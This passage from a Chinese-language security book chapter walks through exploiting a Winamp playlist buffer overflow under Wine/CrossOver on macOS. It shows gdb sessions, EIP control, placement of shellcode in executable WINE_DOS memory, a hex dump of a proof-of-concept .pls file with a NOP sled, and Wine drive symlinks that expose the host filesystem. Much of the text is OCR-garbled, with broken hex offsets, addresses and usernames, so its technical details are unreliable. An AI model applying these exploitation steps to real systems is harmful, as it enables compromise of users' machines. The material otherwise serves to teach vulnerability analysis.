
## 第2章 过去与现在的威胁

| Address | Debug info | Name (54 modules) |
| --- | --- | --- |
| PE | 3c0000-3e5000 | moss |
| PE | 400000-525000 | winamp |
| PE | 14c000-1501000 | in_cdda |
| PE | 1720000-174e000 | in_dshow |
| PE | 1960000-1966000 | in_linein |
| PE | 1970000-19a2000 | in_midi |
| PE | 1bc0000-1bdb000 | read_file |
| PE | 1be0000-1c1d000 | in_mod |
| PE | 1f40000-1f56000 | in_mp4 |
| PE | 1f60000-1fb7000 | in_vorbis |

![](img/3f6a4a8b6ed1d4458658b001e0374e75_54_0.png)

| Address | Debug info | Name (54 modules) |
| --- | --- | --- |
| PE | 1fc0000-1fbc000 | Deferred | in_wave |
| PE | 70d00000-70c35000 | Deferred | shlwapi |
| PE | 71000000-71149000 | Deferred | shdocvw |
| PE | 71450000-714ae000 | Deferred | crypt32 |
| PE | 78000000-78040000 | Deferred | msvcrt |
| PE | 7b810000-7b87c00 | Export | kernel32 |
| PE | 7bc0000-7bc1400 | Deferred | ntdll |

Threads:
process tid prio (all id:s are in hex)

```
00000040 (D) C:\program files\winamp\winamp.exe
0000002c 2
00000037 0
0000003f 15
00000045 0
0000003c 0
00000044 0
0000003b 0
00000043 0
0000002b 2
00000042 0
0000002d 0==
00000016
0000001c 0
00000017 0
00000018 0
```

与其依赖 `wine` 调试器的输出，不如通过 `gdb` 附加到进程。这将使我们能够实时调试，而不是处理崩溃后的堆栈跟踪。`gdb` 界面与 CrossOver 开发者提供的通用堆栈跟踪相比，为我们提供了更多控制。

![](img/3f6a4a8b6ed1d4458658b001e0374e75_55_0.png)

使用 `ps` 命令获取进程 ID。一旦我们启动了调试器、加载了格式错误的进程并附加到正确的进程，我们就可以看到情况。

```
lt-cni-dlbr81:~ kisterre$ pdb wineloader 4438
/Users/kisterre/4438: No such file or directory.
Attaching to program: /Applications/CrossOver.app/Contents/SharedSupport/CrossOver/bin/wineloader
process 4438.
Reading symbols for shared libraries
+.........................................done
0x94ae29 in read$CANCEL
(gdb) c
```

一旦附加，我们就可以允许进程继续并随后看到它崩溃。

```
程序接收信号 EXC_BAD_ACCESS，无法访问内存。
原因: KERN_PROTECTION_FAILURE at address: 0x43424141
0x43424141 in ??
(gdb) bt
#0 0x43424141 in ??
#1 0x00000000 in ??
(gdb) r
```

```
eax 0x2537
ecx 0x0 0
edx 0x340148 340200
ebx 0x1 1
esp 0x33eb2c 0x33eb2c
ebp 0x0 0
esi 0x7b85dea6 20723754
edi 0x466473c 4605756
eip 0x4342141 0x4342141
flags 0x210206 2163206
cs 0x17 23
ss 0x1f 31
ds 0x1f 31
fs 0x1007 41
gs 0x37 24
```

![](img/3f6a4a8b6ed1d4458658b001e0374e75_56_0.png)

总的来说，一切看起来都很标准。这是一个直接的 `EIP` 命中，我们似乎有一个 shellcode 的合理位置。

```
(gdb) x/10s $esp2
0x33ec56: 'A' <repeats 200 times...>
0x33de31: 'A' <repeats 200 times...>
0x33de6e: 'A' <repeats 200 times...>
0x33eae6: 'A' <repeats 200 times...>
0x33ef76: 'A' <repeats 200 times...>
0x33f03e: 'A' <repeats 200 times...>
```

shellcode 目前被放置在未受 Leopard 内存保护的内存位置，而且实际上是非随机的。此外，我们可以在具有可执行栈的静态内存中找到 shellcode。操作系统的 `vmmap` 工具显示该内存区域为 `WINE_DOS`。

```
localhost:leopard vmmap 664 | grep WINE_DOS
033f000-33f000 [4K] rwx/rwx SM-PRV
/Applications/Crossover.app/Contents/SharedSupport/Crossover/bin/wineloader
WINE_DOS 33f000-334000 [4K] rwx/rwx SM-COW
/Applications/Crossover.app/Contents/SharedSupport/Crossover/bin/wineloader
```

内存中已经有了 `0x41` 字符，我们知道它们将作为 `NOP` 使用。使用 `gdb` 将 `EIP` 指向上述内存，可以快速检查 `WINE_DOS` 内存的可用性。基于此快速测试：

```
(gdb) break *0x33de1
(gdb) set $eip=0x33de1
(gdb) c
```

通过断点并随后单步每条指令，我们验证了我们的理论。

![](img/3f6a4a8b6ed1d4458658b001e0374e75_57_0.png)

该利用的奇怪之处在于放置的 shellcode 是面向 Windows 的，而不是 OSX 的。`WINE_DOS` 内存类型被设置为可执行代码，因此你将需要标准的 Win32 负载。在我的初始测试后，我稍微更改了 Windows 环境，使用了 Windows 98 bottle (`wine`)。实际上，除了 `WINE_DOS` 静态位置外，内存从 `0x0033ec00` 移动到了 `0x0033ff00`。对于最后的测试，使用长 NOP 滑 获取了一个简单调用 `calc.exe` 的 shellcode。

```
0x33ff90: \<repeats 194 times>
```

一旦 `calc.exe` 负载添加且 playlist 格式正确后，测试启动了。

```
1192 ttys002 0:00.19
/Applications/CrossOver.app/Contents/SharedSupport/CrossOver/bin/wineloader
wrapper.exe CrossOver --run
1195 ttys002 0:01.64
/Applications/CrossOver.app/Contents/SharedSupport/CrossOver/lib...
wineloader cmd
1198 tts002 0:01:49
/Applications/CrossOver/app/Contents/SharedSupport/CrossOver/lib../bin/winamp
```

```
localhost: kidsterne xxd poc.pls
0000000: 5b70 6c61 796c 6973 745d 0d0a 0d0a 5469 74 [playlist]..
0000010: 6531 3d57 696c 6162 7025 4758 706f 69 el=Winamp Exploi
0000020: 7420 6279 2055 6265 7368 0d0a 4c65 666e t by Umesh..Leng
0000030: 7468 31d3 3531 32d0 0a75 6265 724f thl=512
0000040: 6645 6e74 7269 6573 3d31 0d0a 5665 7273 Entries=1..Vers
0000050: 696f 6e63 32d0 0466 696c 6531 345c 5c90 File=\\ 
0000060: 9090 9090 9090 9090 9090 9090 9090 9090 ....
0000070: 9090 9090 9090 9090 9090 9090 9090 9090 ....
0000080: 9090 9090 9090 9090 9090 9090 9090 9090 ....
00000900: 9090 9090 9090 9090 9090 9090 9090 9090 ....
00000a00: 9090 9090 9090 9090 9090 9090 9090 9090 ....
00000b00: 9090 9090 9090 9090 9090 9090 9090 9090 ....
00000c00: 9090 9090 9090 9090 9090 9090 9090 9090 ....
00000d00: 9090 9090 9090 9090 9090 9090 9090 9090 ....
00000e00: 9090 9090 9090 9090 9090 9090 9090 9090 ....
00000f00: 9090 9090 9090 9090 9090 9090 9090 9090 ....
00001000: 9090 9090 9090 9090 9090 9090 9090 9090 ....
00001100: 9090 9090 9090 9090 9090 9090 9090 9090 ....
00001200: 9090 9090 9090 9090 9090 9090 9090 9090 ....
00001300: 9090 9090 9090 9090 9090 9090 9090 9090 ....
00001400: 9090 9090 9090 9090 9090 9090 9090 9090 ....
00001500: 9090 9090 9090 9090 9090 9090 9090 9090 ....
00001600: 9090 9090 9090 9090 9090 9090 9090 9090 ....
00001700: 9090 9090 9090 9090 9090 9090 9090 9090 ....
00001800: 9090 9090 9090 9090 9090 9090 9090 9090 ....
00001900: 9090 9090 9090 9090 9090 9090 9090 9090 ....
00001a00: 9090 9090 9090 9090 9090 9090 9090 9090 ....
00001b00: 9090 9090 9090 9090 9090 9090 9090 9090 ....
00001c00: 9090 9090 9090 9090 9090 9090 9090 9090 ....
00001d00: 9090 9090 9090 9090 9090 9090 9090 9090 ....
00001e00: 9090 9090 9090 9090 9090 9090 9090 9090 ....
00001f00: 9090 9090 9090 9090 9090 9090 9090 9090 ....
00002000: 9090 9090 9090 9090 9090 9090 9090 9090 ....
00002100: 9090 9090 9090 9090 9090 9090 9090 9090 ....
00002200: 9090 9090 9090 9090 9090 9090 9090 9090 ....
00002300: 9090 9090 9090 9090 9090 9090 9090 9090 ....
00002400: 9090 9090 9090 9090 9090 9090 9090 9090 ....
00002500: 9090 9090 9090 9090 9090 9090 9090 9090 ....
00002600: 9090 9090 9090 9090 9090 9090 9090 9090 ....
00002700: 9090 9090 9090 9090 9090 9090 9090 9090 ....
00002800: 9090 9090 9090 9090 9090 9090 9090 9090 ....
00002900: 9090 9090 9090 9090 9090 9090 9090 9090 ....
```

### 图 2.3 Winamp

![](img/3f6a4a8b6ed1d4458658b001e0374e75_60_0.png)

### 图 2.3 续

![](img/3f6a4a8b6ed1d4458658b001e0374e75_61_0.png)

此时，你可能在想该如何进一步攻击宿主操作系统。幸运的是，并没有真正可以跳出的 `chroot` 环境。在 `wine` 的默认配置中，用户主目录和文件系统根目录的几个方便映射分别设置为 `Y` 和 `Z`。这可以通过配置选项或使用符号链接（`symlink`）来实现。以下是为 OSX 提供的 CrossOver 默认符号链接示例。

```bash
bash-3.25 pwd
/Users/ministerie/Library/Application Support/CrossOver/Bottles/winxp
shell-20: real dosadevimes/
total 40
```

www.syngress.com

```bash
drwx-xr-x 7 kfinistere kfinistere 238 Jan 7 18:18 .
drwx-xr-x 8 kfinistere kfinistere 272 Jan 8 10:10 ..
lrw-xr-x 1 kfinistere kfinistere 10 Jan 7 18:18 c -> ../drive c
drwx-xr-x 1 kfinistere kfinistere 18 Jan 7 18:18 d: -> /Users/kfinister
drwx-xr-x 1 kfinistere kfinistere 13 Jan 7 18:18 d:: -> /dev/rdiskls2
drwx-xr-x 1 kfinistere kfinistere 18 Jan 7 18:18 y: -> /Users/kfinister
drwx-xr-x 1 kfinistere kfinistere 1 Jan 7 18:18 z: -> /
```

我不太确定从实际利用的角度来看，符号链接还可以如何使用，但在任何导出到 CrossOver 的目录中都可以。奇怪的是，`cmd.exe` 无法看到这些目录，但它可以使用它们。

```bash
localhost:drive_c kfinistere$ ln -s / test
localhost:drive_c kfinistere$ ls -al
total 16
```

```bash
drwx-xr-x 6 kfinistere kfinistere 204 Jan 7 18:22 ..
drwx-xr-x 8 kfinistere kfinistere 272 Jan 7 18:20 .
-rw-r-- 1 kfinistere kfinistere 7 Jan 7 18:18 .windows-label
drwx-xr-x 4 kfinistere kfinistere 136 Jan 7 18:18 Program Files
lrw-xr-x 1 kfinistere kfinistere 1 Jan 7 18:22 test -> /
drwx-xr-x 16 kfinistere kfinistere 544 Jan 7 18:19 windows
```

通过命令行提示符，符号链接由于某种原因是见的。

```cmd
C:\dir
Volume in drive C is drive_c
Volume Serial Number is 0000-0000
Directory of C:\
1/7/2008 6:18 PM 7 .windows-label
1/7/2008 6:18 PM <DIR> Program Files
1/7/2008 6:19 PM <DIR> windows
1 file 7 bytes
2 directories 25,018,503,168 bytes free
```
